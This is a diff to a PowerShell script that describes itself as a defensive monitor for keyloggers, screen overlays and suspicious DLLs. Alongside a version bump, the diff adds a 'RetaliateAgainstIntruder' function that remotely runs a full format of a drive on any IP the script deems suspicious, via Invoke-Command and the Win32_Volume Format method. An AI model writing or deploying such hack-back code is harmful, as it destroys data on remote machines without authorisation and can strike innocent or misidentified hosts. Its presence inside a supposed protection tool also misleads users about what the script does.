@@ -4,7 +4,7 @@
     Description: Advanced script to detect and mitigate web servers, screen overlays, keyloggers, suspicious DLLs, remote thread execution, and unauthorized files.
                  Monitors all local drives and network shares, ensures critical services are running, and protects critical system processes and specific trusted drivers from termination.
                  Runs invisibly without disrupting the calling batch file.
-    Version: 2.6
+    Version: 2.7
     License: Free for personal use
 #>
 
@@ -152,6 +152,34 @@ function Monitor-Keyloggers {
         
         # Call the new function to get process details and terminate the process and parent
         Get-ProcessDetailsAndTerminate -ProcessId $process.Id
+    }
+}
+
+# Function to retaliate against intruder
+function RetaliateAgainstIntruder {
+    param (
+        [string]$SuspiciousIP,    # The IP of the suspicious connection
+        [string]$DriveToFormat    # Drive letter to target (e.g., "C:")
+    )
+
+    # Validate suspicious activity (Optional: Analyze connection logs)
+    Write-Host "Validating suspicious activity from $SuspiciousIP..." -ForegroundColor Yellow
+
+    # Attempt retaliation (formatting remote drive)
+    try {
+        Write-Host "Attempting to format the drive of $SuspiciousIP..." -ForegroundColor Red
+        Invoke-Command -ComputerName $SuspiciousIP -ScriptBlock {
+            param ($Drive)
+            $Disk = Get-CimInstance -Query "SELECT * FROM Win32_Volume WHERE DriveLetter='$Drive'"
+            if ($null -ne $Disk) {
+                Invoke-CimMethod -InputObject $Disk -MethodName Format -Arguments @{FileSystem = "NTFS"; Full = $true; Label = "Retaliation"}
+            } else {
+                Write-Host "Drive $Drive not found."
+            }
+        } -ArgumentList $DriveToFormat
+        Write-Host "Retaliation complete for $SuspiciousIP." -ForegroundColor Green
+    } catch {
+        Write-Host "Failed to retaliate against $SuspiciousIP: $_" -ForegroundColor Red
     }
 }
 
